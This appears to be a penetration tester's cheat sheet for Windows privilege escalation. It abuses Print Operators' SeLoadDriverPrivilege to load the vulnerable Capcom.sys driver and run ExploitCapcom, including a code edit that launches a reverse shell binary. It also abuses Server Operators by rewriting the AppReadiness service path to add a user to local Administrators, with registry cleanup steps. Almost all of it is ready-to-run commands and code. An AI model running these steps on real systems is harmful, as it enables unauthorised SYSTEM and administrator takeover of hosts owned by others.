# Print Operator

## SeLoadDriverPrivilege
if it dont appear use : https://github.com/hfiref0x/UACME
```bash
whoami /priv
  SeLoadDriverPrivilege         Load and unload device drivers       Disabled
```
Download and edit [Capcom.sys](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) :
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
then compile it using cl.exe (with Visual Studio)
```bash
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
Download and save Capcom.sys in C:\temp and then :
```bash
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
## Verify Driver is not Loaded with DriverView.exe
```bash
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
## Verify Privilege is Enabled
```bash
EnableSeLoadDriverPrivilege.exe
```
## Verify Capcom Driver is Listed
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
## Exploit
https://github.com/tandasat/ExploitCapcom
```powershell
.\ExploitCapcom.exe
```

# No GUI
## modify the ExploitCapcom.cpp
```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}

```
## Automating with EopLoadDriver
https://github.com/TarlogicSecurity/EoPLoadDriver/
```bash
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
## Removing Registry Key (clean)
```bash
reg delete HKCU\System\CurrentControlSet\Capcom
```

______________________________________________________________________________________________

# Server Operators
## AppReadiness service
```bah
sc qc AppReadiness
```
## Checking Service Permissions
```bash
PsService.exe security AppReadiness
```
##  Checking Local Admin Group Membership
confirm that the target account is not present.
```bash
net localgroup Administrators
```
## Modifying the Service Binary Path
```bash
# adds the current user to the default local administrators group.
sc config AppReadiness binPath= "cmd /c net localgroup Administrators UserName /add"
```
## Starting the Service
```bash
sc start AppReadiness
# supposed to fail
```
## Confirme Local Admin Group Membership
```bash
net localgroup Administrators
```
## Local Admin Access
```bash
crackmapexec smb IP'SAD -u UserName -p 'PASSWORD'
# UserName and password from the user you add to the local admin group
```








